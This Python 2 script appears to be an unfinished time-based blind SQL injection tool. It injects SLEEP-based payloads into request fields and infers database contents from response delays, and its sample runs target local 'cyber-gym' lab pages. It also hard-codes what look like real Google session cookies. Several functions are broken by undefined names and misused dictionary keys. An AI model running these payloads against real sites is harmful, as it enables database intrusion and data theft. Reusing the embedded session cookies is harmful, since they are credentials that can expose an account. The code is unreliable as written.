import argparse
import sys
import requests
import threading

METHODS = ['GET', 'POST']
GET 	= 0
POST 	= 1

QUOTE_TYPES		= ['', '\'', '\"']
NO_QUOTE		= 0
SINGLE_QUOTE	= 1
DOUBLE_QUOTE	= 2

SQL_SUFFIXES	= ['', '-- -', ' AND {}1{}={}1']
NO_SUFFIX 		= 0
COMMENT_SUFFIX	= 1
AND_SUFFIX_1	= 2

verbose = False
log 	= False
logName = 'time_based.log'

threadsNum = 1
sleepTime  = 0

class httpRequestsThread (threading.Thread):
    def __init__(self, threadID, name, url, method, headers, cookies, data, times):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name 	  = name
        self.url      = url
        self.method   = method
        self.headers  = headers
        self.cookies  = cookies
        self.data     = data
        self.times    = times
    def run(self):
        self.times.append(measureServerResponseTime(self.url, self.method, self.headers, self.cookies, self.data))

def meanValue(lst):
	return sum(lst)/len(lst)

def indexOfMax(lst):
	maxIndex = -1
	maxElement = 0
	for i in range(len(lst)):
		if lst[i] > maxElement:
			maxElement = lst[i]
			maxIndex = i
	return maxIndex

# Convert a string to list of ASCII code 
def stringToInt(string, separator = ','):
	return separator.join(str(ord(c)) for c in string)

def makeRequest(url, method, headers = {}, cookies = {}, data = {}):
	if method == METHODS[GET]:
		return requests.get(url, headers = headers, cookies = cookies, params = data)
	elif method == METHODS[POST]:
		return requests.post(url, headers = headers, cookies = cookies, data = data)
	else:
		return None

def getRequestTime(request):
	return request.elapsed.total_seconds();

def meanTime(times):
	if len(times) == 1:
		return times[0]
	times.pop(indexOfMax(times))
	if len(times) > 1:
		times.pop(indexOfMax(times))
	return meanValue(times)


def measureServerResponseTime(url, method, headers = {}, cookies = {}, data = {}):
	return getRequestTime(makeRequest(url, method, headers, cookies, data))


def measureMeanServerResponseTime(url, method, headers = {}, cookies = {}, data = {}):
	global threadsNum
	times = []
	threads = []
	for i in range(threadsNum):
		t = httpRequestsThread(i, 'Thread-' + str(i), url, method, headers, cookies, data, times)
		t.start()
		threads.append(t)
	for t in threads:
		t.join()
	return meanTime(times)

def measureMeanServerResponseTimePrecise(url, method, headers = {}, cookies = {}, data = {}, roundsNum = 1):
	times = []
	for i in range(roundsNum):
		times.append(measureMeanServerResponseTime(url, method, headers, cookies, data))
	return meanTime(times)

def calculateSleepTime(serverResponseTime):
	if serverResponseTime < 0.1:
		return serverResponseTime * 10
	elif serverResponseTime >= 0.1 and serverResponseTime < 1:
		return response_time * 5
	elif serverResponseTime >= 1 and serverResponseTime < 5:
		return serverResponseTime
	elif serverResponseTime >= 5:
		return serverResponseTime * 0.5


# Correctly forged data are passed to this function to test if the field is injectable and if the server is delayed by input
def isDelayed(url, method, headers, cookies, data):
	global sleepTime
	if measureMeanServerResponseTime(url, method, headers, cookies, data) >= sleepTime:
		return True
	return False

def searchFieldVulnerabilities(url, method, headers, cookies, field, data):
	mData = data.copy()
	for q in QUOTE_TYPES:
		for s in SQL_SUFFIXES:
			suff = s
			if suff == SQL_SUFFIXES[AND_SUFFIX_1]:
				suff = suff.format(q, q, q)
			mData[field] = data[field] + '{} AND SLEEP({}) {}'.format(q, sleepTime, suff)
			if isDelayed(url, method, headers, cookies, mData):
				return {'quoteType':q, 'suffixType': suff}
	return None


# Generates a dictionary with fields as key and a list {'quote_type':'', 'suffix_type':''}
def searchVulnerableFields(url, method, headers, cookies, data):
	vulnerableFields = {}
	for field in data:
		vulnerabilities = searchFieldVulnerabilities(url, method, headers, cookies, field, data)
		if vulnerabilities is not None:
			vulnerableFields.update({field:vulnerabilities})

	return vulnerableFields


def buildSqlInjection(query, operand, value, vulnerabilityType):
	global sleepTime
	return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'.format(vulnerabilityType['quoteType'], query, operand, value, sleepTime, vulnerabilityType['suffixType'])


# vulnerableField --> {vulnerableField:{'quoteType':q, 'suffixType':suff}}
def searchTableRowsCount(url, method, headers, cookies, data, vulnerableField, dbName, tableName, whereParams = {}):
	global sleepTime
	mData = data.copy()
	mTableName = '%s.%s' % (dbName, tableName)

	query = buildQuery()


	found = False
	count = 0

	# Da usare per referenziare i tipi di vulnerabilità
	fields[fields.keys()[0]]['suffixType']

	while not found:
		mData[vulnerableField.keys()] = data[vulnerableField.keys()] + buildSqlInjection(query, '=', str(count), vulnerableField.values())

		if measureMeanServerResponseTime(url, method, headers, cookies, mData) >= sleepTime:
			found = True
		else:
			count += 1

	return count	


def main(argv):
	parser = argparse.ArgumentParser(description = '')
	parser.add_argument('-u', '--url', help = 'The URL on which try the attack.')
	parser.add_argument('-d', '--data', help = 'Payload for data fields. {\'<field>\': \'<value>\',...}', default = '\'{{}}\'')
	parser.add_argument('--headers')
	parser.add_argument('--cookies')
	parser.add_argument('-m', '--method', help = 'The method <GET|POST>.', metavar = '<GET|POST>', default = METHODS[GET], choices = METHODS)
	parser.add_argument('-t', '--threads', type = int, help = 'Number of threads used for evaluating response time', default = 1)
	args = parser.parse_args()


	'''
	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit()
	'''
	


	global threadsNum
	global sleepTime
	url = args.url
	method = args.method
	headers = args.headers
	cookies = args.cookies
	data = args.data
	threadsNum = args.threads

	headers = {
    'authority': 'www.google.it',
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'x-client-data': 'CJe2yQEIorbJAQjEtskBCKmdygEIuZ3KAQioo8oBGKyYygEYkqPKAQ==',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
    'cookie': 'CONSENT=WP.26c729; SID=DQaa1w0eP2SrWqJCJ8PSrMY2kJItAjkhUxKsYySGuYoW3c1pWzh4l0YskRalJ9oPNsIapQ.; HSID=AMjQsZklKuOKf8YqH; SSID=AtxT-ZkomyLldldY2; APISID=2wG4BoZa9_xU-qrc/Am8FMZ0ILIuaO-YvH; SAPISID=Aci4x-FLLURLG-BR/AleShpCCjRFzspq1e; NID=128=IXQAvzsMy-yRhkqW7yApnwxrg3uSOTA7B9N5bdprmXCmbxD_HY7vVSCKWup9HO7_QJxxmtleMzkmaUEev9cGQyiLPuQPlCIc2fhtVIKHl6HYDcH3r2Daca3VWQVyVeRR8A1IBD_woYGAnfZnwsHL2OBssmyUvBxKrrR9sxl2lfp2w49lsFoWmrXSr99cAynak98uAdlYoKd-SDCKJRUupoDlwjTbBZaJCr-lra1cug; 1P_JAR=2018-4-27-14',
	}
	


	# Test1
	url1 = 'http://localhost/cyber-gym/sqli/time_based_blind.php'
	data1 = {'email':'arthur@guide.com'}
	method1 = METHODS[GET]

	responseTime = measureMeanServerResponseTime(url1, method1, headers, {}, data1)
	sleepTime = calculateSleepTime(responseTime)
	fields = searchVulnerableFields(url1, method1, headers, {}, data1)
	
	print fields[fields.keys()[0]]['suffixType']

'''

	# Test2
	url2 = 'http://localhost/cyber-gym/sqli/time_based_blind_escaped.php'
	data2 = {'to':'1', 'msg':''}
	method2 = METHODS[POST]
	responseTime = measureMeanServerResponseTime(url2, method2, headers, {}, data2)
	sleepTime = calculateSleepTime(responseTime)
	fields = searchVulnerableFields(url2, method2, headers, {}, data2)
	print
	print
	print fields
'''
if __name__ == "__main__":
	main(sys.argv[1:])
    
